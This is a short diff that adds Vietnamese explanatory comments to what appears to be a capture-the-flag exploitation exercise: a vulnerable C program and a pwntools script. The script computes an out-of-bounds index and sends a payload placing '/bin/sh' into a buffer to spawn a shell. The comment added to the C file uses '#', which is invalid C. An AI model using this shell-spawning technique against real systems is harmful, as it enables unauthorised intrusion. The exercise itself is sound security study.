@@ -5,7 +5,7 @@
 #include <unistd.h>
 #include <string.h>
 
-char name[16];
+char name[16];     #khai báo là chuỗi
 
 char *command[10] = { "cat",
     "ls",
@@ -56,7 +56,7 @@ command_addr = e.symbols['command']
 
 idx = (name_address - command_addr) / 4    # Tính toán idx
 
-payload = p32(name_address + 4) + b'/bin/sh\x00'  
+payload = p32(name_address + 4) + b'/bin/sh\x00'    # Tại con trỏ này , nhập chuỗi này vào
 
 p.sendafter(b"Admin name: ", payload)
 
